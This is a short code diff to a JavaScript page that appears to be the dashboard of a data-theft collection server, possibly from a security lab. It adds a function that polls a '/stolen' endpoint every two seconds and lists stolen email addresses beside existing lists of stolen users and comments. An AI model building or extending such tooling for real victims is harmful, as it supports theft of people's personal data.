@@ -6,6 +6,14 @@ function refreshUsers() {
             document.getElementById("users").innerHTML = users.map(u => `<li>${u}</li>`).join("");
         });
 }
+// Function to refresh stolen email every 2 seconds
+function refreshEmail() {
+    fetch("/stolen")
+        .then(res => res.json())
+        .then(email => {
+            document.getElementById("email").innerHTML = email.map(u => `<li>${u}</li>`).join("");
+        });
+}
 // Function to refresh stolen comments every 2 seconds
 function refreshComments() {
     fetch("/stolenComments")
@@ -16,6 +24,7 @@ function refreshComments() {
 }
 // Update users and comments every 2 seconds
 setInterval(refreshUsers, 2000);
+setInterval(refreshEmail, 2000);
 setInterval(refreshComments, 2000);
 
 
